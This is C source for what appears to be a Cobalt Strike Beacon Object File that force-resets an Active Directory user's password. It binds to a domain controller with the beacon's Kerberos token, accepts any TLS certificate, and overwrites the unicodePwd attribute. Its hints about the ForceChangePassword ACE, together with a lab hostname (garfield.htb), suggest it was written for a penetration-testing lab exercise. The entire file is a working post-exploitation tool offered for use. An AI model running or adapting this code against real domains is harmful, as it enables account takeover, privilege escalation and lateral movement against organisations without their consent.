#include <windows.h>
#include "beacon.h"

// ── Minimal LDAP types ───────────────────────────────────────────────────────

typedef struct ldap {
    struct {
        UINT_PTR sb_sd;
        UCHAR Reserved1[(10*sizeof(ULONG))+1];
        ULONG_PTR sb_naddr;
        UCHAR Reserved2[(6*sizeof(ULONG))];
    } ld_sb;
    PCHAR ld_host;
    ULONG ld_version;
    UCHAR ld_lberoptions;
    ULONG ld_deref;
    ULONG ld_timelimit;
    ULONG ld_sizelimit;
    ULONG ld_errno;
    PCHAR ld_matched;
    PCHAR ld_error;
    ULONG ld_msgid;
    UCHAR Reserved3[(6*sizeof(ULONG))+1];
    ULONG ld_cldaptries;
    ULONG ld_cldaptimeout;
    ULONG ld_refhoplimit;
    ULONG ld_options;
} LDAP, *PLDAP;

typedef struct berval {
    ULONG bv_len;
    PCHAR bv_val;
} BERVAL, *PBERVAL;

typedef struct ldapmodA {
    ULONG mod_op;
    PCHAR mod_type;
    union {
        PCHAR *modv_strvals;
        struct berval **modv_bvals;
    } mod_vals;
} LDAPModA;

typedef struct ldapmsg {
    ULONG lm_msgid;
    ULONG lm_msgtype;
    PVOID lm_ber;
    struct ldapmsg* lm_chain;
    struct ldapmsg* lm_next;
    ULONG lm_time;
    LDAP* Connection;
    PVOID Request;
    ULONG lm_returncode;
    USHORT lm_referral;
    BOOLEAN lm_chased;
    BOOLEAN lm_eom;
    BOOLEAN ConnectionReferenced;
} LDAPMessage;

// ── Constants ────────────────────────────────────────────────────────────────

#define LDAP_PORT                   389
#define LDAP_SSL_PORT               636
#define LDAP_VERSION3               3
#define LDAP_SUCCESS                0x00
#define LDAP_INSUFFICIENT_RIGHTS    0x32
#define LDAP_NO_SUCH_OBJECT         0x20
#define LDAP_CONSTRAINT_VIOLATION   0x13
#define LDAP_INVALID_CREDENTIALS    0x31
#define LDAP_OPT_VERSION            0x11
#define LDAP_OPT_SSL                0x0a
#define LDAP_OPT_SIGN               0x95
#define LDAP_OPT_ENCRYPT            0x96
#define LDAP_OPT_SERVER_CERTIFICATE 0x81
#define LDAP_OPT_AREC_EXCLUSIVE     0x98
#define LDAP_OPT_ON                 ((void*)1)
#define LDAP_MOD_REPLACE            0x02
#define LDAP_MOD_BVALUES            0x80
#define LDAP_SCOPE_BASE             0x00
#define LDAP_SCOPE_SUBTREE          0x02

#define LDAP_AUTH_NEGOTIATE         0x0486
#define LDAP_AUTH_KERBEROS          0x0800

// ── Imports ──────────────────────────────────────────────────────────────────

DECLSPEC_IMPORT LDAP*  WLDAP32$ldap_init(PCHAR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_set_option(LDAP* ld, int option, const void* invalue);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_bind_s(LDAP* ld, const PCHAR dn, const PCHAR cred, ULONG method);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_unbind_s(LDAP* ld);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_modify_s(LDAP* ld, const PCHAR dn, LDAPModA** mods);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_search_s(LDAP* ld, const PCHAR base, ULONG scope, const PCHAR filter, PCHAR* attrs, ULONG attrsonly, LDAPMessage** res);
DECLSPEC_IMPORT LDAPMessage* WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT PCHAR* WLDAP32$ldap_get_values(LDAP* ld, LDAPMessage* entry, const PCHAR attr);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_value_free(PCHAR* vals);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_msgfree(LDAPMessage* res);
DECLSPEC_IMPORT PCHAR  WLDAP32$ldap_err2stringA(ULONG err);
DECLSPEC_IMPORT ULONG  WLDAP32$ldap_connect(LDAP* ld, struct l_timeval* timeout);

DECLSPEC_IMPORT size_t __cdecl MSVCRT$strlen(const char* str);
DECLSPEC_IMPORT char*  __cdecl MSVCRT$strcpy(char* dest, const char* src);
DECLSPEC_IMPORT int    __cdecl MSVCRT$_snprintf(char* buf, size_t count, const char* fmt, ...);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$malloc(size_t size);
DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void* ptr);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memcpy(void* dest, const void* src, size_t n);
DECLSPEC_IMPORT void*  __cdecl MSVCRT$memset(void* dest, int c, size_t n);

typedef BOOLEAN (*VERIFYSERVERCERT)(PLDAP, PCCERT_CONTEXT);

// ── Cert callback (accept all) ───────────────────────────────────────────────

BOOLEAN _cert_cb(PLDAP c, PCCERT_CONTEXT p) { return TRUE; }

// ── Password encoder: "pw" as UTF-16LE, no BOM, no null terminator ───────────

BERVAL* _encode_password(const char* pw) {
    if (!pw) return NULL;
    size_t pwlen = MSVCRT$strlen(pw);
    if (!pwlen) return NULL;

    ULONG wchars = (ULONG)(pwlen + 2);         // leading + trailing quote
    ULONG nbytes = wchars * sizeof(wchar_t);

    wchar_t* wbuf = (wchar_t*)MSVCRT$malloc(nbytes);
    if (!wbuf) return NULL;

    wbuf[0] = L'"';
    for (size_t i = 0; i < pwlen; i++) {
        wbuf[1 + i] = (wchar_t)(unsigned char)pw[i];
    }
    wbuf[1 + pwlen] = L'"';

    BERVAL* bv = (BERVAL*)MSVCRT$malloc(sizeof(BERVAL));
    if (!bv) { MSVCRT$free(wbuf); return NULL; }
    bv->bv_len = nbytes;
    bv->bv_val = (char*)wbuf;
    return bv;
}

// ── Resolve sAMAccountName → DN ──────────────────────────────────────────────

char* _find_dn(LDAP* ld, const char* sam, const char* base) {
    char filter[256];
    MSVCRT$_snprintf(filter, sizeof(filter), "(sAMAccountName=%s)", sam);
    char* attrs[] = { "distinguishedName", NULL };
    LDAPMessage* res = NULL;

    ULONG r = WLDAP32$ldap_search_s(ld, (char*)base,
                                     LDAP_SCOPE_SUBTREE, filter, attrs, 0, &res);
    if (r != LDAP_SUCCESS) return NULL;

    LDAPMessage* e = WLDAP32$ldap_first_entry(ld, res);
    if (!e) { WLDAP32$ldap_msgfree(res); return NULL; }

    char** vals = WLDAP32$ldap_get_values(ld, e, "distinguishedName");
    char* dn = NULL;
    if (vals && vals[0]) {
        size_t len = MSVCRT$strlen(vals[0]) + 1;
        dn = (char*)MSVCRT$malloc(len);
        if (dn) MSVCRT$strcpy(dn, vals[0]);
        WLDAP32$ldap_value_free(vals);
    }
    WLDAP32$ldap_msgfree(res);
    return dn;
}

// ── Build DC=x,DC=y from dc01.garfield.htb ──────────────────────────────────

char* _build_nc(const char* dc_fqdn) {
    const char* p = (dc_fqdn && MSVCRT$strlen(dc_fqdn)) ? dc_fqdn : NULL;
    if (!p) return NULL;
    while (*p && *p != '.') p++;
    if (!*p) return NULL;
    p++; // skip the first dot

    int dots = 0;
    const char* q = p;
    while (*q) { if (*q == '.') dots++; q++; }

    size_t domlen = MSVCRT$strlen(p);
    char* nc = (char*)MSVCRT$malloc(domlen + (dots + 1) * 4 + 1);
    if (!nc) return NULL;

    char* w = nc;
    const char* r = p;
    int first = 1;
    while (*r) {
        if (!first) *w++ = ',';
        first = 0;
        *w++ = 'D'; *w++ = 'C'; *w++ = '=';
        while (*r && *r != '.') *w++ = *r++;
        if (*r == '.') r++;
    }
    *w = '\0';
    return nc;
}

// ── Verify password actually changed by reading pwdLastSet ───────────────────

void _verify_change(LDAP* ld, const char* dn) {
    char* vattrs[] = { "pwdLastSet", "whenChanged", NULL };
    LDAPMessage* vres = NULL;

    ULONG r = WLDAP32$ldap_search_s(ld, (PCHAR)dn, LDAP_SCOPE_BASE,
                                     "(objectClass=*)", vattrs, 0, &vres);
    if (r != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Verification search failed (0x%x)", r);
        return;
    }

    LDAPMessage* ve = WLDAP32$ldap_first_entry(ld, vres);
    if (!ve) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Verification: no entry returned");
        WLDAP32$ldap_msgfree(vres);
        return;
    }

    char** p = WLDAP32$ldap_get_values(ld, ve, "pwdLastSet");
    if (p && p[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] pwdLastSet  = %s", p[0]);
        WLDAP32$ldap_value_free(p);
    }
    p = WLDAP32$ldap_get_values(ld, ve, "whenChanged");
    if (p && p[0]) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] whenChanged = %s", p[0]);
        WLDAP32$ldap_value_free(p);
    }
    WLDAP32$ldap_msgfree(vres);
}

// ── Main ─────────────────────────────────────────────────────────────────────

void go(char* args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* target    = BeaconDataExtract(&parser, NULL);
    int   is_dn     = BeaconDataInt(&parser);
    char* new_pass  = BeaconDataExtract(&parser, NULL);
    char* ou_path   = BeaconDataExtract(&parser, NULL);
    char* dc_fqdn   = BeaconDataExtract(&parser, NULL);
    int   use_ldaps = BeaconDataInt(&parser);

    if (!target || !MSVCRT$strlen(target)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Target required"); return;
    }
    if (!new_pass || !MSVCRT$strlen(new_pass)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] New password required"); return;
    }
    if (!dc_fqdn || !MSVCRT$strlen(dc_fqdn)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] DC FQDN required"); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] set-password-auth: using current beacon token");
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target: %s | DC: %s", target, dc_fqdn);

    LDAP* ld = NULL;
    int connected_ldaps = 0;

    // ── Attempt 1: LDAPS 636 (if requested) ─────────────────────────────────
    if (use_ldaps) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Trying LDAPS on 636...");
        ld = WLDAP32$ldap_init((PCHAR)dc_fqdn, LDAP_SSL_PORT);
        if (ld) {
            ULONG ver = LDAP_VERSION3;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SSL, LDAP_OPT_ON);
            VERIFYSERVERCERT cb = _cert_cb;
            WLDAP32$ldap_set_option(ld, LDAP_OPT_SERVER_CERTIFICATE, (void*)&cb);

            ULONG cr = WLDAP32$ldap_connect(ld, NULL);
            if (cr == LDAP_SUCCESS) {
                connected_ldaps = 1;
                BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAPS connection established");
            } else {
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] LDAPS failed (0x%x), falling back to 389 with SASL sign+seal", cr);
                WLDAP32$ldap_unbind_s(ld);
                ld = NULL;
            }
        }
    }

    // ── Attempt 2: LDAP 389 with SASL sign+seal ─────────────────────────────
    if (!ld) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Connecting to LDAP 389 with sign+seal...");
        ld = WLDAP32$ldap_init((PCHAR)dc_fqdn, LDAP_PORT);
        if (!ld) {
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed");
            return;
        }

        ULONG ver = LDAP_VERSION3;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_VERSION, &ver);
        WLDAP32$ldap_set_option(ld, LDAP_OPT_AREC_EXCLUSIVE, LDAP_OPT_ON);

        // CRITICAL: SIGN + ENCRYPT must be ULONG*, not pointer-to-pointer
        ULONG on_val = 1;
        ULONG so_rc;
        so_rc = WLDAP32$ldap_set_option(ld, LDAP_OPT_SIGN, &on_val);
        if (so_rc != LDAP_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAP_OPT_SIGN set failed (0x%x)", so_rc);
        so_rc = WLDAP32$ldap_set_option(ld, LDAP_OPT_ENCRYPT, &on_val);
        if (so_rc != LDAP_SUCCESS)
            BeaconPrintf(CALLBACK_OUTPUT, "[!] LDAP_OPT_ENCRYPT set failed (0x%x)", so_rc);

        ULONG cr = WLDAP32$ldap_connect(ld, NULL);
        if (cr != LDAP_SUCCESS) {
            PCHAR errstr = WLDAP32$ldap_err2stringA(cr);
            BeaconPrintf(CALLBACK_ERROR, "[-] ldap_connect failed (0x%x): %s",
                         cr, errstr ? errstr : "?");
            WLDAP32$ldap_unbind_s(ld);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAP 389 connection established");
    }

    // ── Bind with Kerberos ───────────────────────────────────────────────────
    ULONG rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_KERBEROS);
    if (rc != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] Kerberos-only bind failed (0x%x), trying NEGOTIATE...", rc);
        rc = WLDAP32$ldap_bind_s(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    }
    if (rc != LDAP_SUCCESS) {
        PCHAR errstr = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] Bind failed (0x%x): %s",
                     rc, errstr ? errstr : "?");
        BeaconPrintf(CALLBACK_ERROR, "[!] No usable TGT in current logon session.");
        WLDAP32$ldap_unbind_s(ld);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[+] LDAP bind OK (%s)",
                 connected_ldaps ? "LDAPS/TLS" : "SASL sign+seal");

    // ── Verify sign+seal is active on 389 ────────────────────────────────────
    if (!connected_ldaps) {
        ULONG sign_val = 0, enc_val = 0;
        WLDAP32$ldap_set_option(ld, LDAP_OPT_SIGN, NULL);   // read-back pattern
        // Windows wldap32 doesn't always report it back cleanly; rely on the
        // DC rejecting non-sealed unicodePwd writes as the actual check.
    }

    // ── Resolve DN ───────────────────────────────────────────────────────────
    char* user_dn = NULL;
    char* built_base = NULL;

    if (is_dn) {
        size_t len = MSVCRT$strlen(target) + 1;
        user_dn = (char*)MSVCRT$malloc(len);
        if (user_dn) MSVCRT$strcpy(user_dn, target);
    } else {
        const char* base = (ou_path && MSVCRT$strlen(ou_path)) ? ou_path : NULL;
        if (!base) {
            built_base = _build_nc(dc_fqdn);
            base = built_base;
        }
        if (!base) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Could not derive search base");
            WLDAP32$ldap_unbind_s(ld);
            return;
        }
        user_dn = _find_dn(ld, target, base);
        if (built_base) MSVCRT$free(built_base);
        if (!user_dn) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Could not resolve DN for: %s", target);
            WLDAP32$ldap_unbind_s(ld);
            return;
        }
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] User DN: %s", user_dn);

    // ── Snapshot BEFORE ──────────────────────────────────────────────────────
    BeaconPrintf(CALLBACK_OUTPUT, "[*] --- BEFORE ---");
    _verify_change(ld, user_dn);

    // ── Encode + modify ──────────────────────────────────────────────────────
    BERVAL* pw_bv = _encode_password(new_pass);
    if (!pw_bv) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to encode password");
        MSVCRT$free(user_dn);
        WLDAP32$ldap_unbind_s(ld);
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] Encoded unicodePwd: %lu bytes (UTF-16LE, quoted)", pw_bv->bv_len);

    BERVAL* pw_vals[] = { pw_bv, NULL };
    LDAPModA pw_mod;
    pw_mod.mod_op   = LDAP_MOD_REPLACE | LDAP_MOD_BVALUES;
    pw_mod.mod_type = "unicodePwd";
    pw_mod.mod_vals.modv_bvals = pw_vals;

    LDAPModA* mods[] = { &pw_mod, NULL };
    rc = WLDAP32$ldap_modify_s(ld, user_dn, mods);

    if (rc == LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ldap_modify_s returned SUCCESS");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] --- AFTER ---");
        _verify_change(ld, user_dn);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Confirm pwdLastSet changed. If identical, the DC silently rejected the write.");
    } else {
        PCHAR errstr = WLDAP32$ldap_err2stringA(rc);
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_modify_s failed (0x%x): %s",
                     rc, errstr ? errstr : "?");
        if (rc == LDAP_INSUFFICIENT_RIGHTS)
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Insufficient rights — confirm ForceChangePassword ACE on target");
        if (rc == LDAP_CONSTRAINT_VIOLATION)
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Constraint violation — channel not sealed, or password policy rejected it");
    }

    MSVCRT$memset(pw_bv->bv_val, 0, pw_bv->bv_len);
    MSVCRT$free(pw_bv->bv_val);
    MSVCRT$free(pw_bv);
    MSVCRT$free(user_dn);
    WLDAP32$ldap_unbind_s(ld);
}
